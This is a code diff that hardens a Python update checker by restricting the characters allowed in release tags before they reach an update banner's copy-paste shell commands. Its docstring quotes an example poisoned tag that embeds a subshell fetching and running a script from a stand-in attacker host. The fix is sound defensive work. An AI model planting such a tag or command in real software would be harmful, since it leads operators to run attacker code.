@@ -94,15 +94,36 @@ def _parse_semver(tag: str) -> Optional[tuple[int, int, int, str]]:
     triumphs over a final release with the same x.y.z (matches the
     semver spec: 1.0.0-rc1 < 1.0.0). We model this by treating an
     empty suffix as the highest possible string for the sort key.
+
+    The suffix character class is intentionally narrow: only
+    ``[A-Za-z0-9.]+``. Git tag names permit shell metacharacters
+    (``$``, ``(``, backticks, ``|``, ``;``, quotes, whitespace),
+    so a permissive ``(?:-(.+))?`` would let an adversary with
+    publish access to the repo craft a tag like
+    ``mastio-v9.9.9-$(curl evil.com/x|sh)`` that parses, gets cached,
+    and is then rendered into the "copy these commands" block of
+    ``update_banner.html``. Jinja autoescape protects against HTML
+    injection but browsers copy text content, so the operator
+    pasting into a shell would execute the subshell. Forcing the
+    suffix to alphanumeric + dot eliminates that path while still
+    accepting every realistic pre-release tag (``rc1``, ``alpha.2``,
+    ``beta3``, ``dev.20251231``).
     """
     if not tag.startswith(_TAG_PREFIX):
         return None
     rest = tag[len(_TAG_PREFIX):]
-    m = re.match(r"^(\d+)\.(\d+)\.(\d+)(?:-(.+))?$", rest)
+    m = re.match(r"^(\d+)\.(\d+)\.(\d+)(?:-([A-Za-z0-9.]+))?$", rest)
     if not m:
         return None
     major, minor, patch, suffix = m.groups()
     return int(major), int(minor), int(patch), suffix or ""
+
+
+# Belt-and-suspenders character class for the tag as a whole, applied
+# in ``get_update_status`` before rendering. Catches the case where a
+# legacy cached value (from a previous bundle with a looser regex)
+# survives across an upgrade.
+_TAG_SAFE_RE = re.compile(r"^[A-Za-z0-9.\-]+$")
 
 
 def _is_newer(candidate_tag: str, current_version: str) -> bool:
@@ -233,15 +254,23 @@ async def get_update_status() -> UpdateStatus:
     dismissed = await get_config(_KEY_DISMISSED_TAG)
     last_poll = await get_config(_KEY_LAST_POLL)
 
+    # Belt-and-suspenders: refuse to surface a cached tag that does
+    # not match the safe character class even if it somehow slipped
+    # past ``_parse_semver`` (legacy cache row from a permissive build,
+    # manual DB tampering, etc.). The banner renders this value into
+    # a shell-command block, so a poisoned tag must never reach the
+    # template.
+    safe_tag = latest_tag if (latest_tag and _TAG_SAFE_RE.match(latest_tag)) else None
+
     available = False
-    if latest_tag and _is_newer(latest_tag, current):
-        if dismissed != latest_tag:
+    if safe_tag and _is_newer(safe_tag, current):
+        if dismissed != safe_tag:
             available = True
 
     return UpdateStatus(
         current=current,
-        latest=latest_tag,
-        latest_url=latest_url,
+        latest=safe_tag,
+        latest_url=latest_url if safe_tag else None,
         available=available,
         last_polled_at=last_poll,
     )
